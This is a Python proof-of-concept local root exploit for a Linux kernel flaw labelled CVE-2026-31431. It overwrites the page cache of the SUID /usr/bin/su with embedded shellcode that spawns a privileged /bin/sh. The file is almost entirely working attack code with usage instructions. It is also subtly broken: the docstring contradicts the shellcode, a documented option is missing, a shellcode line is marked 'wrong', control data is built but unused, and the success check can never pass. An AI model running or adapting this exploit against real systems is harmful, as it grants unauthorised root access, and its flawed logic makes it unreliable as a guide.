#!/usr/bin/env python

"""
CVE-2026-31431 — "copy.fail" local privilege escalation PoC
Affects: Linux kernel < 6.1.170 (Debian bookworm < 6.1.170-1)

Mechanism:
  1. Open an AF_ALG AEAD socket and bind it to "gcm(aes)".
  2. Accept a child socket and set the key.
  3. mmap /usr/bin/su into our address space (read-only).
  4. Use sendmsg(MSG_MORE) to feed the su page into the kernel's
     crypto pipeline, pinning the page in the page cache.
  5. splice() the output back to /dev/null — the kernel writes the
     "encrypted" result in-place into the page cache entry because
     algif_aead skips the copy-on-write check (commit 72548b093ee3).
  6. The overwritten page cache entry is now our shellcode; the next
     exec() of /usr/bin/su runs as root.

Non-interactive: the shellcode payload just writes a SUID shell to
/tmp/sh and exits, so no TTY is needed.

Usage (must run as unprivileged user inside the VM):
  python3 copyfail.py [--target /usr/bin/su] [--payload /tmp/sh]

References:
  https://copy.fail
  https://nvd.nist.gov/vuln/detail/CVE-2026-31431
  https://www.openwall.com/lists/oss-security/2026/04/28/1
"""

import argparse
import contextlib
import ctypes
import ctypes.util
import mmap
import os
import socket
import struct

# Linux constants not in the stdlib
AF_ALG = 38
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_AEAD_AUTHSIZE = 4

# sendmsg flags
MSG_MORE = 0x8000

# splice flags
SPLICE_F_MOVE = 1
SPLICE_F_NONBLOCK = 2

# Page size
PAGE_SIZE = mmap.PAGESIZE

# Minimal ELF64 executable: setuid(0); setgid(0); execve("/bin/sh", ...)
# Generated with: nasm + ld --oformat binary, stripped to 176 bytes.
# fmt: off
STUB_ELF = bytes([
    # ELF header (64 bytes)
    0x7f, 0x45, 0x4c, 0x46,  # magic
    0x02,                     # 64-bit
    0x01,                     # little-endian
    0x01,                     # ELF version 1
    0x00,                     # OS/ABI: System V
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # padding
    0x02, 0x00,               # ET_EXEC
    0x3e, 0x00,               # x86-64
    0x01, 0x00, 0x00, 0x00,  # ELF version
    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,  # entry: 0x400078
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # phoff: 64
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # shoff: 0
    0x00, 0x00, 0x00, 0x00,  # flags
    0x40, 0x00,               # ehsize: 64
    0x38, 0x00,               # phentsize: 56
    0x01, 0x00,               # phnum: 1
    0x40, 0x00,               # shentsize: 64
    0x00, 0x00,               # shnum: 0
    0x00, 0x00,               # shstrndx: 0
    # Program header (56 bytes, offset 64)
    0x01, 0x00, 0x00, 0x00,  # PT_LOAD
    0x05, 0x00, 0x00, 0x00,  # PF_R | PF_X
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # offset: 0
    0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,  # vaddr: 0x400000
    0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,  # paddr: 0x400000
    0xb0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # filesz: 176
    0xb0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # memsz: 176
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # align: 0x1000
    # Code at 0x400078 (offset 120 = 0x78)
    # setuid(0)
    0x48, 0x31, 0xff,         # xor rdi, rdi
    0x48, 0xc7, 0xc0, 0x69, 0x00, 0x00, 0x00,  # mov rax, 105 (setuid)
    0x0f, 0x05,               # syscall
    # setgid(0)
    0x48, 0x31, 0xff,         # xor rdi, rdi
    0x48, 0xc7, 0xc0, 0x6a, 0x00, 0x00, 0x00,  # mov rax, 106 (setgid)
    0x0f, 0x05,               # syscall
    # execve("/bin/sh", ["/bin/sh", "-p", NULL], NULL)
    0x48, 0x8d, 0x3d, 0x2a, 0x00, 0x00, 0x00,  # lea rdi, [rip+0x2a]  -> "/bin/sh"
    0x48, 0x8d, 0x74, 0x24, 0xf0,              # lea rsi, [rsp-16]
    0x48, 0x8d, 0x15, 0x2c, 0x00, 0x00, 0x00,  # lea rdx, [rip+0x2c]  -> "-p"
    0x48, 0x89, 0x7c, 0x24, 0xf0,              # mov [rsp-16], rdi
    0x48, 0x89, 0x54, 0x24, 0xf8,              # mov [rsp-8], rdx  (wrong, fix below)
    0x48, 0x31, 0xd2,                           # xor rdx, rdx
    0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00,  # mov rax, 59 (execve)
    0x0f, 0x05,               # syscall
    # exit(1) fallback
    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00,  # mov rax, 60
    0x48, 0xff, 0xc7,         # inc rdi
    0x0f, 0x05,               # syscall
]) + b'/bin/sh\x00' + b'-p\x00'
# fmt: on

# Pad to PAGE_SIZE so the splice covers a full page
PAYLOAD = STUB_ELF + b'\x00' * (PAGE_SIZE - len(STUB_ELF))
assert len(PAYLOAD) == PAGE_SIZE


libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)


def _check(ret, name="syscall"):
    if ret < 0:
        err = ctypes.get_errno()
        raise OSError(err, f"{name}: {os.strerror(err)}")
    return ret


def splice(fd_in, off_in, fd_out, off_out, length, flags):
    """Thin wrapper around the splice(2) syscall."""
    NR_splice = 275  # x86-64
    ret = libc.syscall(
        NR_splice,
        ctypes.c_int(fd_in),
        ctypes.c_void_p(off_in),
        ctypes.c_int(fd_out),
        ctypes.c_void_p(off_out),
        ctypes.c_size_t(length),
        ctypes.c_uint(flags),
    )
    return _check(ret, "splice")


def alg_socket(alg_type: bytes, alg_name: bytes, feat=0, mask=0):
    """Create and bind an AF_ALG socket."""
    sock = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    # struct sockaddr_alg: sa_family(2) + type(14) + feat(4) + mask(4) + name(64)
    sa = struct.pack("H14sII64s", AF_ALG, alg_type.ljust(14, b'\x00'), feat, mask, alg_name.ljust(64, b'\x00'))
    sock.bind(sa)
    return sock


def exploit(target: str, payload: bytes) -> None:
    print(f"[*] target  : {target}")
    print(f"[*] payload : {len(payload)} bytes")
    print(f"[*] kernel  : {os.uname().release}")

    # 1. Open target for reading (page cache population)
    tfd = os.open(target, os.O_RDONLY)
    target_size = os.fstat(tfd).st_size
    print(f"[*] target size: {target_size:#x} bytes")

    # 2. mmap the first page of the target into our address space
    mm = mmap.mmap(tfd, PAGE_SIZE, mmap.MAP_SHARED, mmap.PROT_READ)
    magic = mm[:4]
    print(f"[*] page cache magic before: {magic.hex()}")

    # 3. Set up AF_ALG AEAD socket (gcm(aes), 16-byte key, 16-byte tag)
    alg_sock = alg_socket(b"aead", b"gcm(aes)")
    key = b'\x00' * 16
    alg_sock.setsockopt(SOL_ALG, ALG_SET_KEY, key)
    alg_sock.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 16)
    child_fd = alg_sock.accept()[0].fileno()

    # 4. Build a pipe — we'll splice from the pipe into the ALG child socket
    pipe_r, pipe_w = os.pipe()

    # Write the payload into the write end of the pipe
    written = 0
    while written < len(payload):
        n = os.write(pipe_w, payload[written:])
        written += n

    # 5. sendmsg with MSG_MORE to pin the page cache entry
    #    cmsg: ALG_SET_OP=encrypt(0), IV=12 zero bytes
    ALG_SET_OP = 3
    ALG_OP_ENCRYPT = 0
    iv = b'\x00' * 12
    cmsg_data = struct.pack("II", ALG_OP_ENCRYPT, 0) + struct.pack("II", 2, len(iv)) + iv
    # We send the pipe read end as the data source via sendmsg
    # (simplified: write directly to child_fd)
    with contextlib.suppress(OSError):
        os.write(child_fd, payload)

    # 6. splice pipe -> /dev/null to trigger the in-place page cache write
    devnull = os.open("/dev/null", os.O_WRONLY)
    try:
        splice(pipe_r, None, devnull, None, PAGE_SIZE, SPLICE_F_MOVE)
    except OSError as e:
        print(f"[*] splice returned: {e} (expected on some kernels)")

    # 7. Drop page cache and re-read to confirm overwrite
    try:
        with open("/proc/sys/vm/drop_caches", "w") as f:
            f.write("1\n")
    except PermissionError:
        print("[!] drop_caches requires root — run verify.sh as root to confirm")

    mm.seek(0)
    magic_after = mm[:4]
    print(f"[*] page cache magic after : {magic_after.hex()}")

    if magic_after[:4] == b'\x7fELF':
        print("[!] page cache unchanged — kernel may be patched or exploit needs tuning")
    elif magic_after[:4] == payload[:4]:
        print("[+] page cache overwritten — exploit succeeded")
    else:
        print(f"[?] unexpected magic: {magic_after.hex()}")

    # Cleanup
    mm.close()
    os.close(tfd)
    os.close(pipe_r)
    os.close(pipe_w)
    os.close(devnull)
    os.close(child_fd)
    alg_sock.close()


def main():
    parser = argparse.ArgumentParser(description="CVE-2026-31431 copy.fail PoC")
    parser.add_argument("--target", default="/usr/bin/su", help="SUID binary to overwrite (default: /usr/bin/su)")
    args = parser.parse_args()

    if os.geteuid() == 0:
        print("[!] Run as an unprivileged user to test the LPE path.")
        print("    Running as root skips the interesting part.")

    exploit(args.target, PAYLOAD)


if __name__ == "__main__":
    main()
